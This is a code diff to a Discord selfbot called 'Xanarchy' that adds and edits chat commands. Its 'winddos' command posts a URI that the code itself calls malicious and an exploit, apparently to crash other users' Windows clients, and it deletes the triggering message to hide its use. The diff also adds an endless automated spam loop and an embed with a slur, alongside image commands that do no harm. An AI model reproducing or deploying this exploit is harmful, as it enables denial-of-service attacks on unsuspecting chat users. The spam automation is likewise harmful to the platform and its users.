@@ -898,6 +898,34 @@ async def login(ctx, _token): # b'\xfc'
     driver.get("https://discordapp.com/login")
     driver.execute_script(script+f'\nlogin("{_token}")')
 
+class Winddos(object):
+
+    def __init__(self, token, channel):
+        self.token = token
+        self.channel_id = channel
+        self.headers = {'Authorization': token}
+
+
+    def execute(self):
+        """ send malicious URI """
+        return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': '<ms-cxh-full://0>'})
+
+@Xanarchy.command()
+async def winddos(ctx):
+    await ctx.message.delete()
+
+    try:
+        exploit = Winddos(token, ctx.message.channel.id)
+        exploit.execute()
+    except:
+        pass
+
+@Xanarchy.command()
+async def hor(ctx): # b'\xfc'
+    await ctx.message.delete()
+    em = discord.Embed(description='Vaporwave',title='Hall of Retards')
+    await ctx.send(embed=em)
+
 @Xanarchy.command()
 async def botlogin(ctx, _token): # b'\xfc'
     await ctx.message.delete()
@@ -1842,6 +1870,20 @@ async def _fish_dank(ctx, channelid): # b'\xfc'
         except Exception as e:
             print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
 
+@Xanarchy.command(name='auto-candy', aliases=['candy'])
+async def candy(ctx, channelid): # b'\xfc'
+    await ctx.message.delete()
+    count = 0
+    while True:
+        try:
+            count += 1
+            channel = Xanarchy.get_channel(int(channelid))
+            await channel.send('pls use candy')
+            print(f'{Fore.BLUE}[AUTO-CANDY] {Fore.GREEN}Candy number: {count} sent'+Fore.RESET)
+            await asyncio.sleep(6)
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
+
 @Xanarchy.command()
 async def tts(ctx, *, message): # b'\xfc'
     await ctx.message.delete()
@@ -2138,47 +2180,47 @@ async def lesbian(ctx): # b'\xfc'
     await ctx.send(embed=em)
 
 @Xanarchy.command()
-async def feed(ctx, user: discord.Member): # b'\xfc'
+async def feed(ctx, user): # b'\xfc'
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/feed")
     res = r.json()
-    em = discord.Embed(description=user.mention)
+    em = discord.Embed(description=user + ' has been fed by ' + Xanarchy.user.name)
     em.set_image(url=res['url'])
     await ctx.send(embed=em)
 
 @Xanarchy.command()
-async def tickle(ctx, user: discord.Member): # b'\xfc'
+async def tickle(ctx, user): # b'\xfc'
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/tickle")
     res = r.json()
-    em = discord.Embed(description=user.mention)
+    em = discord.Embed(description=user + ' has been tickled by ' + Xanarchy.user.name)
     em.set_image(url=res['url'])
     await ctx.send(embed=em)
 
 @Xanarchy.command()
-async def slap(ctx, user: discord.Member): # b'\xfc'
+async def slap(ctx, user): # b'\xfc'
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/slap")
     res = r.json()
-    em = discord.Embed(description=user.mention)
+    em = discord.Embed(description=user + ' has been slapped by ' + Xanarchy.user.name)
     em.set_image(url=res['url'])
     await ctx.send(embed=em)
 
 @Xanarchy.command()
-async def hug(ctx, user: discord.Member): # b'\xfc'
+async def hug(ctx, user): # b'\xfc'
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/hug")
     res = r.json()
-    em = discord.Embed(description=user.mention)
+    em = discord.Embed(description=user + ' has been hugged by ' + Xanarchy.user.name)
     em.set_image(url=res['url'])
     await ctx.send(embed=em)
 
 @Xanarchy.command()
-async def smug(ctx, user: discord.Member): # b'\xfc'
+async def smug(ctx, user): # b'\xfc'
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/smug")
     res = r.json()
-    em = discord.Embed(description=user.mention)
+    em = discord.Embed(description=user)
     em.set_image(url=res['url'])
     await ctx.send(embed=em)
 
@@ -2476,17 +2518,17 @@ async def hacked(ctx, user): # b'\xfc'
     await ctx.send(embed=em)
 
 @Xanarchy.command()
-async def sniper(ctx): # b'\xfc'
+async def sniper(ctx, user): # b'\xfc'
     await ctx.message.delete()
     em = discord.Embed(description=user + ' Has been sniped', colour=discord.Colour(0xf00))\
-         .set_image(url="https://i.imgur.com/MFgTfX5.gif")
+         .set_image(url="https://i.imgur.com/ey46gL5.gif")
     await ctx.send(embed=em)
 
 @Xanarchy.command()
-async def happyre(ctx, user): # b'\xfc'
+async def happyre(ctx): # b'\xfc'
     await ctx.message.delete()
     em = discord.Embed(description=' ', colour=discord.Colour(0xf00))\
-         .set_image(url="https://i.imgur.com/ey46gL5.gif")
+         .set_image(url="https://i.imgur.com/MFgTfX5.gif")
     await ctx.send(embed=em)
 
 @Xanarchy.command()
